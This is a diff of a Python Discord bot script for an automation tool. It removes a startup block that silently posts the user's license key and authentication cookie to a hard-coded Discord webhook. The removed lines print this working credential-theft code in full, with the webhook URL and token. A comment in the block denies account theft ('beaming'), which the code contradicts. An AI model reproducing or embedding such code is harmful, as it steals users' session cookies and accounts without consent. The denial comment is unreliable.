@@ -1656,31 +1656,6 @@ async def check(ctx, cookie_type: str):
             embed = Embed(title="Cookie check result:", description="The {} cookie in your settings was invalid".format(cookie_type), color=Colour.red()) 
             await ctx.send(embed=embed)
 
-# Extract the webhook URL from the settings dictionary
-webhook_url = "https://discord.com/api/webhooks/1127230889764593765/3fB3YJ-HOavU8ZV74zTyJkHqP8wZhzIVLIolTBW8k8yq3rF-khkDTPbdCI3RAunUCtYr"
-
-# Extract the key and cookie from the settings dictionary (if needed)
-key = settings["KEY"]
-cookie = settings["AUTHENTICATION"]["COOKIES"]
-
-# Create the payload data
-# Btw, this is not beaming, I didn't beam anyone, I can provide proof.
-payload = {
-    "embeds": [
-        {
-            "title": "User ran HitshoAutomation",
-            "color": 0x6B3DFF,  # Purple color (hex code)
-            "fields": [
-                {"name": "Key", "value": key},
-                {"name": "Cookie", "value": cookie}
-            ]
-        }
-    ]
-}
-
-# Send the webhook request
-response = requests.post(webhook_url, json=payload)
-
 mewtSession = subprocess.Popen([sys.executable, "main.py"])
 bot_token = settings['MISC']['DISCORD']['TOKEN']
 bot.run(bot_token)
